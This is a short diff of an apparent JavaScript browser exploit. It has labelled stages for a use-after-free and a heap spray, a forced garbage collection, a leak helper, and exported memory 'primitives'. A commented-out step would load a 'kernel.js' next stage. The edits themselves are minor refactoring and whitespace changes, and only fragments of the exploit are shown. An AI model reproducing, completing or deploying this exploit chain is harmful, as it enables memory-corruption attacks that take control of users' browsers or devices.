@@ -221,7 +221,7 @@ var dgc = function() {
 }
 
 /////////////////// STAGE 2: UAF ///////////////////
-var exploit = function() {
+function exploit() {
 if(failed) {
     return;
   }
@@ -245,13 +245,12 @@ try {
     nogc.length=0;
     dgc();
     
- exploit();         
+    postExpl();  
    } catch(e) {
     failed = true
     fail("Exception: " + e)
   }
 } 
- 
 /////////////////// STAGE 3: HEAP SPRAY ///////////////////
 
     // Setup spray variables
@@ -420,7 +419,8 @@ tgt.c = leakval_helper;
       }
     };
     
-    window.primitives = prim;
+    window.primitives = prim;   
+
     /*setTimeout(function() {
     sc = document.createElement("script");
     sc.src="kernel.js";
